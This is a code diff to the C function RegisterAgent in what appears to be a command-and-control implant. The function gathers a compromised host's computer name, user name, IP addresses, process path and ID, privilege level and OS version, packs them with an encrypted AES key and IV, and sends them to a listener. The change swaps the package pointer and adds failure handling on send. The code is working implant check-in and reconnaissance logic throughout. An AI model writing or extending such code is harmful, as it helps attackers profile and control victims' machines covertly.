@@ -48,22 +48,22 @@ INT RegisterAgent(pAgent agent) {
     INT err;
     pPackage pPack;
 
-    if ((pPack = CreatePackageWithMetaData(INITIALIZE_AGENT, agent)) == NULL) {
+    if ((pPack = CreatePackageWithMetaData(REGISTER_AGENT, agent)) == NULL) {
         printf("[error] attempting to create package\n");
         return -1;
     }
     //add package to agentData.
-    agent->packages = pPack;
+    agent->MetaDataPackage = pPack;
     AddPackageToAgentPackageList(agent, pPack);
 
 
-    if ((err = AddBytesToPackage(agent->packages, agent->EncryptedAESKey, agent->EncryptedAESKeySize)) != PACKAGE_SUCCESS)
+    if ((err = AddBytesToPackage(pPack, agent->EncryptedAESKey, agent->EncryptedAESKeySize)) != PACKAGE_SUCCESS)
     {
         printf("[error] attempting to add aes key to package\n");
         return -1;
     }
 
-    if ((err = AddBytesToPackage(agent->packages, agent->EncryptedIV, agent->EncryptedIVSize)) != PACKAGE_SUCCESS)
+    if ((err = AddBytesToPackage(pPack, agent->EncryptedIV, agent->EncryptedIVSize)) != PACKAGE_SUCCESS)
     {
         printf("[error] attempting to add aes key to package\n");
         return -1;
@@ -73,27 +73,27 @@ INT RegisterAgent(pAgent agent) {
         printf("[error] attempting to enumerate\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(agent->packages, AGENT_MAGIC_VALUE)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, AGENT_MAGIC_VALUE)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add magic value to package\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(agent->packages, agent->config->AgentID)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, agent->config->AgentID)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add agent id to package\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(agent->packages,  StringLengthA(agent->Context->ComputerName))) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack,  StringLengthA(agent->Context->ComputerName))) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add computer name string length to package\n");
 		return -1;
 	}
-    if ((err = AddStringToPackage(agent->packages, agent->Context->ComputerName)) != PACKAGE_SUCCESS) {
+    if ((err = AddStringToPackage(pPack, agent->Context->ComputerName)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add computer name to package\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(agent->packages, StringLengthA(agent->Context->UserName))) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, StringLengthA(agent->Context->UserName))) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add username string length to package\n");
         return -1;
     }
-    if ((err = AddStringToPackage(agent->packages, agent->Context->UserName)) != PACKAGE_SUCCESS) {
+    if ((err = AddStringToPackage(pPack, agent->Context->UserName)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add user name to package\n");
         return -1;
     }
@@ -106,22 +106,22 @@ INT RegisterAgent(pAgent agent) {
             Adapters++;
             continue;
         }
-        if((err = AddInt32ToPackage(agent->packages, StringLengthA(agent->Context->IPAddress[Adapters][IPS]))) != PACKAGE_SUCCESS) {
+        if((err = AddInt32ToPackage(pPack, StringLengthA(agent->Context->IPAddress[Adapters][IPS]))) != PACKAGE_SUCCESS) {
             printf("[error] attempting to add adapter string length to package\n");
             return -1;
         }
-        if ((err = AddStringToPackage(agent->packages, agent->Context->IPAddress[Adapters][IPS])) != PACKAGE_SUCCESS) {
+        if ((err = AddStringToPackage(pPack, agent->Context->IPAddress[Adapters][IPS])) != PACKAGE_SUCCESS) {
             printf("[error] attempting to add adapters to package\n");
             return -1;
         }
         IPS++;
         while(agent->Context->IPAddress[Adapters][IPS] != NULL && IPS < 5) {
-            if((err = AddInt32ToPackage(agent->packages, StringLengthA(agent->Context->IPAddress[Adapters][IPS]))) != PACKAGE_SUCCESS) {
+            if((err = AddInt32ToPackage(pPack, StringLengthA(agent->Context->IPAddress[Adapters][IPS]))) != PACKAGE_SUCCESS) {
                 printf("[error] attempting to add ip address string length to package\n");
                 return -1;
             }
          
-			if ((err = AddStringToPackage(agent->packages, agent->Context->IPAddress[Adapters][IPS])) != PACKAGE_SUCCESS) {
+			if ((err = AddStringToPackage(pPack, agent->Context->IPAddress[Adapters][IPS])) != PACKAGE_SUCCESS) {
 				printf("[error] attempting to add ip address to package\n");
 				return -1;
 			}
@@ -129,15 +129,15 @@ INT RegisterAgent(pAgent agent) {
 		}
         Adapters++;
     }
-    if ((err = AddInt32ToPackage(agent->packages, ((PRTL_USER_PROCESS_PARAMETERS)agent->pTeb->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Length)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, ((PRTL_USER_PROCESS_PARAMETERS)agent->pTeb->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Length)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add process name length to package\n");
         return -1;
     }
-    if((err = AddWStringToPackage(agent->packages, (  (PRTL_USER_PROCESS_PARAMETERS ) agent->pTeb->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Buffer ) ) != PACKAGE_SUCCESS) {
+    if((err = AddWStringToPackage(pPack, (  (PRTL_USER_PROCESS_PARAMETERS ) agent->pTeb->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Buffer ) ) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add computer name to package\n");
 		return -1;
 	}
-    if ((err = AddInt32ToPackage(agent->packages, (DWORD)(ULONG_PTR) agent->pTeb->ClientId.UniqueProcess)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, (DWORD)(ULONG_PTR) agent->pTeb->ClientId.UniqueProcess)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add process id to package\n");
         return -1;
     }
@@ -145,40 +145,44 @@ INT RegisterAgent(pAgent agent) {
     //    printf("[error] attempting to add parent process id to package\n");
     //    return -1;
     //}
-    if((err = AddInt32ToPackage(agent->packages, agent->Context->Process_Arch)) != PACKAGE_SUCCESS) {
+    if((err = AddInt32ToPackage(pPack, agent->Context->Process_Arch)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add platform id to package\n");
 		return -1;
 	}
-    if ((err = AddInt32ToPackage(agent->packages, agent->Context->Elevated)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, agent->Context->Elevated)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add elevated to package\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(agent->packages, agent->Context->dwMajorVersion)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, agent->Context->dwMajorVersion)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add major version to package\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(agent->packages, agent->Context->dwMinorVersion)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, agent->Context->dwMinorVersion)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add minor version to package\n");
 		return -1;
 	}
-    if ((err = AddInt32ToPackage(agent->packages, agent->Context->wProductType)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, agent->Context->wProductType)) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add product type number to package\n");
 		return -1;
 	}
-    if ((err = AddInt32ToPackage(agent->packages, agent->Context->wServicePackMajor)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, agent->Context->wServicePackMajor)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add service pack number to package\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(agent->packages, agent->Context->dwBuildNumber)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, agent->Context->dwBuildNumber)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add build number to package\n");
         return -1;
     }
-    if ((err = AddInt32ToPackage(agent->packages, agent->Context->OS_Arch)) != PACKAGE_SUCCESS) {
+    if ((err = AddInt32ToPackage(pPack, agent->Context->OS_Arch)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add os arch to package\n");
         return -1;
     }
 
-    PackageSendMetaDataPackage(agent->packages, NULL, NULL, agent);
+	if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL, agent)) != PACKAGE_SUCCESS) {
+		printf("[error] attempting to send package\n");
+		agent->config->listenerConfig.CurrentHost->NumFailures++;
+		return -1;
+	}
 
     return err;
 }
